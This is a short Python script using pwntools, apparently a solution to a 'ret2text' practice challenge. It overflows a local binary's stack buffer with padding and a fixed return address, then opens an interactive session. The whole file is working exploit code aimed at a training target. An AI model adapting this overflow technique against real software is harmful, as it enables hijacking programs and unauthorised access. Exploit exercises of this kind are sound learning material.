from pwn import *
sh = process('/home/gebsoul/ROP/ret2text')
target = 0x804863a
sh.sendline(b'A' * (0x6c + 4) + p32(target) )
sh.interactive()
